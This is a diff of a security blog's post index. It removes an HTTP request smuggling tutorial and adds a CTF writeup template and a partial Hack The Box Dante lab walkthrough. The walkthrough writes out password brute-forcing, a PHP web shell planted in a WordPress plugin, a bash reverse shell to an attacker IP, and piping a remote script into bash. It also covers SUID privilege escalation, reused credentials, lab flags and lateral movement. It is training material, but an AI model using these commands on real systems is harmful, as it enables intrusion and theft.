@@ -50,124 +50,1571 @@ hashcat爆破：hashcat -m 18200 hash.txt rockyou.txt
       </tags>
   </entry>
   <entry>
-    <title>HTTP 请求走私</title>
-    <url>/2026/08/14/http-request-smuggling/</url>
-    <content><![CDATA[HTTP请求走私是一种攻击技术，利用前端和后端服务器对HTTP请求的解析差异，将恶意请求夹带在合法请求中，从而绕过安全控制，访问敏感数据或攻击其他用户。
-漏洞原理：HTTP请求走私漏洞的产生主要是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：Content-Length头和Transfer-Encoding头。前端和后端服务器可能对这两种头的处理方式不同，从而导致请求边界的不同步。
-Content-Length头
-POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling
+    <title>CTF Writeup 写作模板</title>
+    <url>/2026/08/14/ctf-writeup-template/</url>
+    <content><![CDATA[
+这是一篇示例文章，展示 Writeup 的推荐写法。写完自己的 Writeup 后可以删除本文。
 
-Transfer-Encoding头
-POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedbq=smuggling0
-
-常见的HTTP请求走私类型
-
-CL-TE漏洞：前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。
-TE-CL漏洞：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。
-TE-TE漏洞：前端和后端服务器都使用Transfer-Encoding头，但可以通过混淆头来诱导其中一台服务器不处理它。
-
-入口点:HTTP请求走私的攻击入口主要存在于前端代理服务器与后端应用服务器之间的连接链路上，常见的入口场景包括：
-1. 反向代理 &#x2F; 负载均衡器
-Nginx、Apache、HAProxy、F5、Cloudflare 等反向代理或负载均衡设备与后端 Tomcat、Jetty、Node.js 等应用服务器之间
-代理层负责连接复用（keep-alive），将多个前端请求复用到同一条后端 TCP 连接上
-
-2. CDN &#x2F; WAF 后端
-CDN 节点与源站服务器之间
-WAF（Web应用防火墙）仅检查前端可见的请求部分，走私的恶意请求被后端单独解析从而绕过 WAF 检测
-
-3. 支持 HTTP 管道化 &#x2F; 连接复用的网关
-API 网关、微服务网关（如 Kong、Zuul、Spring Cloud Gateway）
-任何将多个 HTTP 请求复用到同一后端 TCP 连接的中间件
-
-4. 常见可利用的页面&#x2F;接口
-登录接口、用户认证页面（可走私出其他用户的会话）
-搜索、评论等反射型输入点（可配合 XSS 扩大危害）
-静态资源缓存节点（可实施缓存投毒）
+一、题目信息
 
 
-利用思路:基本原理回顾
-攻击者构造一个包含两个请求边界的特制请求：前端服务器按一种方式解析（认为是一个请求），后端服务器按另一种方式解析（认为是两个请求），从而将第二个”隐藏请求”走私到后端。
-三类漏洞的利用方式CL-TE 漏洞（前端用CL，后端用TE）
-思路：前端根据 Content-Length 认为请求已结束，将完整请求转发给后端；后端按 Transfer-Encoding: chunked 解析，第一个 chunk 结束后，剩余内容被当作下一个独立请求处理
-利用：在请求体中嵌入第二个请求，后端会单独处理该走私请求
-
-POST / HTTP/1.1Host: target.comContent-Length: 50Transfer-Encoding: chunked0GET /admin HTTP/1.1Host: target.comX: 
-
-TE-CL 漏洞（前端用TE，后端用CL）
-思路：前端按 chunked 解析，读到 0\r\n\r\n 认为请求结束；后端根据 Content-Length 判断请求长度，超出部分被拼接到下一个用户的请求前面
-利用：走私的请求前缀会污染下一个请求，影响其他用户
-
-POST / HTTP/1.1Host: target.comContent-Length: 4Transfer-Encoding: chunked5cGET /admin HTTP/1.1Host: target.comContent-Type: application/x-www-form-urlencodedContent-Length: 15x=10
-
-TE-TE 漏洞（两端都用TE，但可混淆）
-思路：前后端都支持 chunked，但通过混淆 Transfer-Encoding 头（如加空格、大小写变体、重复头、前缀后缀），让其中一台服务器不识别该头，转而使用 Content-Length 或忽略
-常见混淆手法：
-Transfer-Encoding: xchunked（加前缀）
-Transfer-Encoding : chunked（冒号后多空格）
-Transfer-Encoding: chunked, identity（多值）
-重复的 Transfer-Encoding 头
-大小写变体：transfer-encoding、TRANSFER-ENCODING
+项目
+内容
 
 
 
-进阶利用场景
+赛事
+某某 CTF 2026
 
 
-利用场景
-说明
+题目
+题目名称
 
 
-
-绕过访问控制
-走私请求直接访问被前端&#x2F;WAF拦截的路径（如 &#x2F;admin）
-
-
-缓存投毒
-将恶意响应写入缓存，影响所有访问该缓存的用户
+类型
+Web &#x2F; Pwn &#x2F; Crypto &#x2F; Misc &#x2F; Reverse
 
 
-会话劫持
-通过走私请求窃取其他用户的请求头中的 Cookie &#x2F; Token
+分值
+500
 
 
-XSS 升级
-将反射型 XSS 转化为存储型&#x2F;扩散型危害
+难度
+⭐⭐⭐
 
 
-凭据窃取
-走私请求诱导后端将下一个用户的请求内容返回给攻击者
+二、题目描述把题目描述和附件下载链接贴在这里。
+三、解题过程3.1 信息收集打开题目，观察页面，抓包分析：
+curl -s http://target.com/ | head -20
+
+3.2 漏洞分析发现漏洞点，说明原理：
+import requestsr = requests.get(&#x27;http://target.com/flag.php&#x27;)print(r.text)
+
+3.3 漏洞利用给出完整的利用脚本（POC &#x2F; EXP）：
+python3 exp.py
 
 
+注意：关键 payload 记得用代码块包裹，方便读者复制。
 
-代码特点1. 同时存在两种长度标识请求中同时出现 Content-Length 和 Transfer-Encoding 头，且两端服务器对优先级处理不一致：
+四、获取 Flagflag&#123;this_is_an_example_flag&#125;
 
-有的服务器优先使用 Content-Length
-有的服务器优先使用 Transfer-Encoding
-有的服务器在两者共存时报错，有的则静默选择其中一个
-
-2. Transfer-Encoding 解析不严格后端代码对 Transfer-Encoding 头的解析存在宽松匹配问题：
-// 不安全的解析示例：未严格校验头格式if (header.contains(&quot;chunked&quot;)) &#123;    useChunked = true;&#125;// 应使用严格的 equals 或规范化后比较
-
-3. 前后端使用不同的 HTTP 解析库
-前端用 Nginx（C 语言解析），后端用 Tomcat（Java 解析）
-不同语言、不同库对 HTTP 规范的实现细节存在差异
-特别是对模糊边界情况（重复头、空格、大小写）的处理不一致
-
-4. 代理层未正确规范化请求头
-代理服务器在转发请求前，没有移除或规范化歧义的请求头
-安全的代理应在检测到 CL + TE 共存时，优先以 TE 为准并移除 CL，或直接拒绝请求
-
-5. Chunked 编码边界处理缺陷
-对 chunk size 的解析不严格（允许前导零、空白字符）
-对最后一个 chunk（0\r\n\r\n）的尾部处理不完善
-chunk 扩展字段（chunk extensions）处理逻辑存在漏洞
+五、总结
+考察的知识点
+踩过的坑
+相关参考链接
 
 ]]></content>
       <categories>
-        <category>Web安全</category>
+        <category>CTF</category>
       </categories>
       <tags>
-        <tag>HTTP请求走私</tag>
+        <tag>CTF</tag>
+        <tag>Writeup</tag>
+        <tag>模板</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB Dante 靶场 Writeup</title>
+    <url>/2026/08/14/htb-dante/</url>
+    <content><![CDATA[入口10.10.110.0/24简介Dante是一个现代化但适合初学者的专业实验室，提供学习常见红队方法论的机会，并熟悉Parrot OS Linux发行版中包含的工具。Dante LLC已聘请您的服务来审计他们的网络。该公司过去未进行全面的渗透测试，希望减少技术债务。他们担心任何实际的泄露都可能导致收入损失和声誉受损。突破边界后，你需要横向和垂直探索网络，直到获得所有主机的管理权限并达到域管理员权限。你将提升信息收集和态势感知技能，能够利用Windows和Linux缓冲区溢出，熟悉Metasploit框架，以及更多其他内容！沿途有许多旗帜可以被夺取，有些位于主攻路线上，有些则在支线任务中，你必须去寻找。提交旗帜将推动你进入名人堂，并在此过程中获得徽章作为奖励。这个红队操作员一级实验室将让玩家接触到：枚举漏洞开发横向移动特权升级网络应用攻击你的入口点在10.10.110.0/24。10.10.110.2 的防火墙不在权限范围内
+
+入口：10.10.110.0&#x2F;24
+linux:10.10.110.100先扫活机
+sudo nmap -sn 10.10.110.0/24
+
+
+
+10.10.110.2，10.10.110.100(已知10.10.110.2 的防火墙不在权限范围内)
+nmap :
+
+21&#x2F;tcp    open  ftp     vsftpd 3.0.3 Anonymous FTP login allowed
+22&#x2F;tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+65000&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+
+访问http://10.10.110.100:65000/
+dirsearch :
+&#x2F;robots.txt 
+
+
+flag1:DANTE{Y0u_Cant_G3t_at_m3_br0!}
+&#x2F;wordpress
+&#x2F;wordpress&#x2F;wp-login.php
+fscan：
+fscan -h 10.10.110.0/24
+
+
+
+&#x2F;wordpress
+
+
+&#x2F;wordpress&#x2F;wp-login.php
+
+
+wpscan扫漏洞
+# -e 枚举，p 插件，t 主题，u 用户wpscan --url http://10.10.110.100:65000/wordpress -e p,t,u
+
+结果：
+
+WordPress 5.4.1
+用户：&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;admin&lt;/font&gt; 和 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;james&lt;/font&gt;
+&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;/wp-content/debug.log&lt;/font&gt;：&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;   wordpress根目录
+&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;/wp-content/uploads/&lt;/font&gt;
+XML-RPC 开启，可用于暴力破解
+
+爆破：
+wpscan --url http://10.10.110.100:65000/wordpress -U james,admin -P /usr/share/wordlists/rockyou.txt --password-attack wp-login --throttle 1
+
+但很久都没爆出来
+:::info参考 wp,也可以考虑使用页面的内容或者其他敏感内容生成字典，实在爆破不出来时可以考虑这种方法。
+cewl 是一个用于生成自定义单词列表的工具,可以爬取指定 URL 的网页内容，返回一个单词列表，用生成的字典爆破
+:::
+cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks &gt; words.txt
+
+wpscan --url http://10.10.110.100:65000/wordpress -U james,admin -P words.txt --password-attack wp-login --throttle 1
+
+
+
+用户名 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;james&lt;/font&gt;，密码 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;Toyota&lt;/font&gt;
+登录
+
+
+ftp:
+Anonymous FTP login allowed
+
+
+
+
+todo.txt
+
+
+1- 完成 WordPress 权限更改 —— 待处理2- 在切换至端口 80 前，更新链接以使用 DNS 名称 —— 待处理3- 移除其他站点的本地文件包含（LFI）漏洞 —— 待处理4- 将 James 的密码重置为更安全的密码 —— 待处理5- 在初级渗透测试员评估之前加固系统 —— 进行中
+说明其他站点存在本地文件包含（LFI）漏洞
+目前没有找到其他站点，所以还是原来的思路，再wordpress里写码
+Wordpress - HackTricks，主要有以下的几种方法：
+
+修改主题模板。
+修改插件文件。
+上传插件。
+
+访问 &#x2F;wordpress&#x2F;wp-admin&#x2F;theme-editor.php?file&#x3D;404.php&amp;theme&#x3D;twentytwenty 修改 404.php。添加一句话：&lt;font style=&quot;color:rgb(52, 52, 60);&quot;&gt;eval($_POST[&quot;pass&quot;]);&lt;/font&gt;，但是有报错，是版本问题
+使用Plugins → Editor写入木马，发现已经有了
+
+
+自己又操作一遍
+
+左侧菜单进入「Installed Plugins（已安装插件）」
+找到 Akismet Anti-Spam，点击Deactivate（停用）
+此时插件状态变为inactive，再切回「Plugin Editor」编辑akismet/index.php
+
+&lt;?phpif(isset($_GET[&#x27;cmd&#x27;]))&#123;    system($_GET[&#x27;cmd&#x27;]);&#125;?&gt;
+
+
+
+可rce
+
+
+getshell
+http://10.10.110.100:65000/wordpress/wp-content/plugins/akismet/index.php?cmd=bash -c &#x27;bash -i &gt;%26 /dev/tcp/10.10.16.59/4444 0&gt;%261&#x27;
+
+
+
+www-data 普通用户
+DANTE-WEB-NIX01主机名
+172.16.1.100&#x2F;24 内网 ip 172.16.1.100
+netstat -tulpn:
+
+
+有mysql
+数据库凭证:
+cat /var/www/html/wordpress/wp-config.php | grep DB_
+
+
+
+用户名密码：shaun password
+查看用户列表:
+cat /etc/passwd | grep -v nologin
+
+
+
+挂代理，上fscan
+./fscan -h 172.16.1.100/24┌──────────────────────────────────────────────┐│    ___                              _        ││   / _ \     ___  ___ _ __ __ _  ___| | __    ││  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    ││ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     ││ \____/     |___/\___|_|  \__,_|\___|_|\_\    │└──────────────────────────────────────────────┘      Fscan Version: 2.0.1[1.9s]     已选择服务扫描模式[1.9s]     开始信息扫描[1.9s]     CIDR范围: 172.16.1.0-172.16.1.255[1.9s]     generate_ip_range_full[1.9s]     解析CIDR 172.16.1.100/24 -&gt; IP范围 172.16.1.0-172.16.1.255[1.9s]     最终有效主机数量: 256[1.9s]     开始主机扫描[1.9s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[1.9s]     正在尝试无监听ICMP探测...[1.9s]     ICMP连接失败: dial ip4:icmp 127.0.0.1: socket: operation not permitted[1.9s]     当前用户权限不足,无法发送ICMP包[1.9s]     切换为PING方式探测...[1.9s] [*] 目标 172.16.1.100    存活 (ICMP)[1.9s] [*] 目标 172.16.1.101    存活 (ICMP)[1.9s] [*] 目标 172.16.1.13     存活 (ICMP)[1.9s] [*] 目标 172.16.1.102    存活 (ICMP)[1.9s] [*] 目标 172.16.1.10     存活 (ICMP)[1.9s] [*] 目标 172.16.1.12     存活 (ICMP)[2.9s] [*] 目标 172.16.1.17     存活 (ICMP)[2.9s] [*] 目标 172.16.1.19     存活 (ICMP)[5.0s] [*] 目标 172.16.1.5      存活 (ICMP)[7.0s]     存活主机数量: 9[7.0s]     有效端口数量: 233[7.0s] [*] 端口开放 172.16.1.100:81[7.0s] [*] 端口开放 172.16.1.100:80[7.0s] [*] 端口开放 172.16.1.100:22[7.0s] [*] 端口开放 172.16.1.100:21[7.0s] [*] 端口开放 172.16.1.101:21[7.0s] [*] 端口开放 172.16.1.13:445[7.0s] [*] 端口开放 172.16.1.13:443[7.0s] [*] 端口开放 172.16.1.13:80[7.0s] [*] 端口开放 172.16.1.101:139[7.0s] [*] 端口开放 172.16.1.101:135[7.0s] [*] 端口开放 172.16.1.101:445[7.0s] [*] 端口开放 172.16.1.102:445[7.0s] [*] 端口开放 172.16.1.102:135[7.0s] [*] 端口开放 172.16.1.102:139[7.0s] [*] 端口开放 172.16.1.102:443[7.0s] [*] 端口开放 172.16.1.102:80[7.0s] [*] 端口开放 172.16.1.102:3306[7.0s] [*] 端口开放 172.16.1.10:445[7.0s] [*] 端口开放 172.16.1.10:22[7.0s] [*] 端口开放 172.16.1.10:80[7.0s] [*] 端口开放 172.16.1.12:443[7.0s] [*] 端口开放 172.16.1.17:80[7.0s] [*] 端口开放 172.16.1.12:3306[7.0s] [*] 端口开放 172.16.1.17:445[7.0s] [*] 端口开放 172.16.1.17:139[7.0s] [*] 端口开放 172.16.1.12:80[7.0s] [*] 端口开放 172.16.1.12:21[7.0s] [*] 端口开放 172.16.1.12:22[7.0s] [*] 端口开放 172.16.1.10:139[7.0s] [*] 端口开放 172.16.1.19:80[7.0s] [*] 端口开放 172.16.1.17:10000[7.0s] [*] 端口开放 172.16.1.5:135[7.0s] [*] 端口开放 172.16.1.5:445[7.0s] [*] 端口开放 172.16.1.19:8080[7.0s] [*] 端口开放 172.16.1.5:139[7.0s] [*] 端口开放 172.16.1.5:21[7.0s] [*] 端口开放 172.16.1.5:1433[10.0s]     扫描完成, 发现 37 个开放端口[10.0s]     存活端口数量: 37[10.0s]     开始漏洞扫描[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer[10.0s] [+] 172.16.1.101 CVE-2020-0796 SmbGhost Vulnerable[10.0s] [+] 172.16.1.13 CVE-2020-0796 SmbGhost Vulnerable[10.0s] [*] NetInfo 扫描结果目标主机: 172.16.1.5主机名: DANTE-SQL01发现的网络接口:   IPv4地址:      └─ 172.16.1.5[10.0s] [*] NetInfo 扫描结果目标主机: 172.16.1.101主机名: DANTE-WS02发现的网络接口:   IPv4地址:      └─ 172.16.1.101[10.1s] [+] NetBios 172.16.1.101    WORKGROUP\DANTE-WS02          [10.1s] [+] NetBios 172.16.1.102    WORKGROUP\DANTE-WS03          [10.1s] [+] SMB认证成功 172.16.1.17:445 administrator:P@ssword123[10.1s] [*] NetInfo 扫描结果目标主机: 172.16.1.102主机名: DANTE-WS03发现的网络接口:   IPv4地址:      └─ 172.16.1.102[10.1s] [*] 网站标题 http://172.16.1.102       状态码:200 长度:1237   标题:Dante Marriage Registration System :: Home Page[10.1s] [*] 网站标题 http://172.16.1.13        状态码:302 长度:0      标题:无标题 重定向地址: http://172.16.1.13/dashboard/[10.1s] [*] 网站标题 https://172.16.1.12       状态码:302 长度:0      标题:无标题 重定向地址: https://172.16.1.12/dashboard/[10.1s] [*] 网站标题 http://172.16.1.100       状态码:200 长度:10918  标题:Apache2 Ubuntu Default Page: It works[10.1s] [*] 网站标题 http://172.16.1.10        状态码:200 长度:28842  标题:Dante Hosting[10.1s] [+] NetBios 172.16.1.17     WORKGROUP\DANTE-NIX03         [10.1s] [+] 172.16.1.102 CVE-2020-0796 SmbGhost Vulnerable[10.1s] [*] 网站标题 http://172.16.1.17        状态码:200 长度:963    标题:Index of /[10.1s] [*] 网站标题 http://172.16.1.13/dashboard/ 状态码:200 长度:7576   标题:Welcome to XAMPP[10.1s] [*] 网站标题 https://172.16.1.12/dashboard/ 状态码:200 长度:7574   标题:Welcome to XAMPP[10.1s] [*] 网站标题 http://172.16.1.19        状态码:200 长度:553    标题:Index of /[10.2s] [*] 网站标题 http://172.16.1.12        状态码:302 长度:0      标题:无标题 重定向地址: http://172.16.1.12/dashboard/[10.2s]     POC加载完成: 总共387个，成功387个，失败0个[10.2s] [+] FTP服务 172.16.1.5:21 匿名登录成功![10.2s] [*] 网站标题 https://172.16.1.13       状态码:302 长度:0      标题:无标题 重定向地址: https://172.16.1.13/dashboard/[10.2s] [+] SMB认证成功 172.16.1.10:445 administrator:pass@123[10.2s] [*] 网站标题 https://172.16.1.102      状态码:200 长度:1237   标题:Dante Marriage Registration System :: Home Page[10.2s] [+] NetBios 172.16.1.5      WORKGROUP\DANTE-SQL01               Windows Server 2016 Standard 14393[10.2s] [*] 网站标题 http://172.16.1.12/dashboard/ 状态码:200 长度:7574   标题:Welcome to XAMPP[10.3s] [+] FTP服务 172.16.1.100:21 匿名登录成功![10.3s] [*] 网站标题 http://172.16.1.19:8080   状态码:403 长度:793    标题:无标题[10.3s] [*] 网站标题 https://172.16.1.13/dashboard/ 状态码:200 长度:7576   标题:Welcome to XAMPP[10.3s]     SMB2共享信息 172.16.1.17:445 administrator Pass:P@ssword123 共享:[forensics IPC$][10.3s] [*] 网站标题 http://172.16.1.17:10000  状态码:200 长度:4622   标题:Login to Webmin[10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:123456 共享:[forensics IPC$][10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:password 共享:[forensics IPC$][10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass: 共享:[forensics IPC$][10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass: 共享:[print$ SlackMigration IPC$][10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:admin 共享:[forensics IPC$][10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:admin123 共享:[forensics IPC$][10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:Password 共享:[print$ SlackMigration IPC$][10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:admin123 共享:[print$ SlackMigration IPC$][10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:pass@123 共享:[print$ SlackMigration IPC$][10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:admin 共享:[print$ SlackMigration IPC$][10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:root 共享:[print$ SlackMigration IPC$][10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:pass123 共享:[forensics IPC$][10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:pass123 共享:[print$ SlackMigration IPC$][10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:Password 共享:[forensics IPC$][10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:123456 共享:[print$ SlackMigration IPC$][10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:pass@123 共享:[forensics IPC$][10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:P@ssword123 共享:[print$ SlackMigration IPC$][10.5s]     SMB2共享信息 172.16.1.17:445 administrator Pass:root 共享:[forensics IPC$][10.5s]     SMB2共享信息 172.16.1.10:445 administrator Pass:password 共享:[print$ SlackMigration IPC$][mysql] 2026/07/14 03:41:53 connection.go:49: busy buffer
+
+fscan（部分主机名来自后面的补充）
+
+
+IP地址
+主机名
+关键开放端口
+重要发现 &#x2F; 漏洞
+
+
+
+172.16.1.100  
+DANTE-WEB-NIX01 10.10.110.100(入口机，拿下）
+80.81.22.21
+ FTP 匿名  
+
+
+172.16.1.101
+DANTE-WS02（拿下）
+21, 135, 139, 445
+SmbGhost (CVE-2020-0796) 漏洞
+
+
+172.16.1.102
+DANTE-WS03（拿下）
+80, 135, 139, 443, 445, 3306
+SmbGhost 漏洞，运行“Dante Marriage Registration System”
+
+
+172.16.1.5
+DANTE-SQL01(拿下）
+21, 135, 139, 445, 1433
+FTP 匿名登录成功，Windows Server 2016
+
+
+172.16.1.10
+DANTE-NIX02（拿下）
+22, 80, 139, 445
+SMB 认证成功 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;administrator:pass@123&lt;/font&gt;
+
+
+172.16.1.12
+DANTE-NIX04（拿下）
+21, 22, 80, 443, 3306
+运行 XAMPP
+
+
+172.16.1.13
+DANTE-WS01（拿下）
+80, 443, 445
+SmbGhost 漏洞，运行 XAMPP
+
+
+172.16.1.17
+DANTE-NIX03（拿下）
+80, 139, 445, 10000
+SMB 认证成功 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;administrator:P@ssword123&lt;/font&gt;，运行 Webmin
+
+
+172.16.1.19
+DANTE-NIX07（拿下）
+80, 8080
+目录列表 (Index of &#x2F;)
+
+
+172.16.1.20
+DANTE-DC01(拿下）
+445,80,22,139,135,389,443,88
+发现漏洞 172.16.1.20 MS17-010
+
+
+172.16.2.5
+DANTE-DC02（拿下）
+88,135,139,445
+
+
+
+172.16.2.101
+DANTE-ADMIN-NIX05（拿下）
+22
+
+
+
+172.16.2.6
+DANTE-ADMIN-NIX06（拿下）
+22
+
+
+
+挂的代理能挂上，但不稳定，很多命令也无权限，先在shell里提权
+TTY：当前 Shell 可能不是完整的终端，先用 Python 生成一个：
+python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;
+
+执行后，提示符可能会变化，此时再尝试 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;su&lt;/font&gt;。
+切换至 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;james&lt;/font&gt; 用户
+su james
+
+输入密码：&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;Toyota&lt;/font&gt;，变成 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;james&lt;/font&gt; 用户，但 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;james&lt;/font&gt; 没有 sudo 权限，现在需要继续提权
+切换至 **&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;balthazar&lt;/font&gt;** 用户
+但是没有密码，查找终端历史，找到了mysql的
+mysql -u balthazar -p TheJoker12345!
+
+复用TheJoker12345!密码，登录上了**&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;balthazar&lt;/font&gt;** 用户
+但是权限还是低，还是要提权到root,那就找提权漏洞
+运行 **&lt;font style=&quot;color:rgb(15, 17, 21);background-color:#FBF5CB;&quot;&gt;linpeas.sh&lt;/font&gt;** 自动化枚举，****可以快速发现提权路径
+curl http://10.10.16.59:8000/linpeas.sh | bash &gt; /tmp/linpeas.txt
+
+结果：
+
+SUID 提权（最简单直接）
+**&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;/usr/bin/find&lt;/font&gt;** 设置了 SUID 位。可以利用 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;-exec&lt;/font&gt; 参数以 root 身份执行命令
+**&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;/usr/bin/pkexec&lt;/font&gt;** 也可能存在漏洞 (CVE-2021-4034)
+
+
+内核漏洞
+系统内核为 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;5.4.0-29-generic&lt;/font&gt;，已检测到多个可能存在的内核漏洞，包括 CVE-2021-3493 (Ubuntu OverlayFS)、CVE-2022-32250 (nft_object UAF) 等
+
+
+文件与凭证
+发现了 WordPress 的备份配置文件 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;/var/www/html/wordpress.bak/wp-config.php&lt;/font&gt;，其中包含数据库凭证 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;shaun:password&lt;/font&gt;。
+MySQL 以 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;mysql&lt;/font&gt; 用户运行，但密码未知
+&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;balthazar&lt;/font&gt; 用户目录下存在 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;.ssh&lt;/font&gt; 文件夹，可能有私钥。
+
+
+计划任务 (Cron)
+&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;/etc/cron.d/&lt;/font&gt; 中有一个 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;php&lt;/font&gt; 文件，但内容未知，需要检查是否有可写的脚本以 root 权限运行。
+系统存在 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;anacron&lt;/font&gt;，可能会定期执行任务
+
+
+
+利用 SUID **&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;/usr/bin/find&lt;/font&gt;** 提权
+
+原理：&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;find&lt;/font&gt; 以 SUID root 权限运行，&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;-exec&lt;/font&gt; 可以执行任意命令
+
+find / -type f -exec /bin/bash -p \; -quit
+
+ 
+flag2：DANTE{Too_much_Pr1v!!!!}
+james 的 目录下还有一个flag，用这个shell一起拿了
+cat /home/james/flag.txt 
+
+flag3 ：DANTE{j4m3s_NEEd5_a_p455w0rd_M4n4ger!}
+现在要利用之前fscan扫出来的东西横向：
+
+
+用smb横向
+使用代理扫描内网 SMB 主机
+proxychains netexec smb 172.16.1.0/24 -u administrator -p pass@123 --shares
+
+关键点：
+
+&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;172.16.1.10&lt;/font&gt;（DANTE-NIX02）：存在共享 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;SlackMigration&lt;/font&gt;（只读）。
+&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;172.16.1.17&lt;/font&gt;（DANTE-NIX03）：存在共享 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;forensics&lt;/font&gt;（读写）。
+两个 Linux Samba 服务器都接受 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;administrator:pass@123&lt;/font&gt; 和 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;james:Toyota&lt;/font&gt; 作为 Guest 用户（无实际权限），但我们可以尝试访问共享。
+
+访问 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;172.16.1.10&lt;/font&gt; 的 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;SlackMigration&lt;/font&gt; 共享
